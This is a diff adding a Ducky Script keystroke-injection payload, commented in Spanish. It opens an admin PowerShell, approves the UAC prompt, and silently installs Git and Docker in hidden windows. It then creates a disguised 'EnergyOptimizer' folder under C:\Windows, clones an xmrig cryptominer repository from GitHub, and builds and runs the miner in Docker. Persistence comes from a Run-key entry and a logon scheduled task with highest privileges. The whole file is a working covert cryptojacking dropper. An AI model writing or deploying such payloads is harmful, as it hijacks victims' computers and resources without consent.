@@ -1,0 +1,63 @@
+REM Abrir PowerShell como admin
+DELAY 200
+GUI r
+DELAY 400
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+WAITFOR "Administrador: Windows PowerShell"
+DELAY 1500
+ALT s
+DELAY 1500
+
+REM INSTANCIA 1 - Instalar Git
+STRING Start-Process powershell -ArgumentList 'winget install --id Git.Git -e --silent' -WindowStyle Hidden
+ENTER
+DELAY 500
+
+REM INSTANCIA 2 - Instalar Docker Desktop
+STRING Start-Process powershell -ArgumentList 'winget install --id Docker.DockerDesktop -e --silent' -WindowStyle Hidden
+ENTER
+DELAY 500
+
+REM INSTANCIA 3 - Actualizar WSL
+STRING Start-Process powershell -ArgumentList 'wsl --update' -WindowStyle Hidden
+ENTER
+DELAY 500
+
+REM CREAR CARPETA Y SCRIPT task.ps1
+STRING mkdir C:\Windows\EnergyOptimizer
+ENTER
+DELAY 500
+STRING Set-Content -Path C:\Windows\EnergyOptimizer\task.ps1 -Value @'
+ENTER
+STRING $dockerPath = "C:\Program Files\Docker\Docker\Docker Desktop.exe"
+ENTER
+STRING $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+ENTER
+STRING Set-ItemProperty -Path $regPath -Name "Docker Desktop" -Value "`"$dockerPath`""
+ENTER
+STRING cd C:\Windows\EnergyOptimizer
+ENTER
+STRING git clone http://github.com/anarcoiris/xmrig
+ENTER
+STRING Start-Sleep -Seconds 600
+ENTER
+STRING Start-Process powershell -WindowStyle Hidden -ArgumentList 'cd C:\Windows\EnergyOptimizer\xmrig; docker build -t xmrig-custom .; docker compose up --build -d'
+ENTER
+STRING '@
+ENTER
+
+DELAY 500
+
+REM CREAR TAREA PROGRAMADA PARA INICIAR EN PRÓXIMO INICIO
+STRING $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-ExecutionPolicy Bypass -File "C:\Windows\EnergyOptimizer\task.ps1"'
+ENTER
+STRING $Trigger = New-ScheduledTaskTrigger -AtLogOn
+ENTER
+STRING Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "DockerAndXmrigInit" -User "$env:USERNAME" -RunLevel Highest -Force
+ENTER
+
+REM Fin
+STRING exit
+ENTER
+
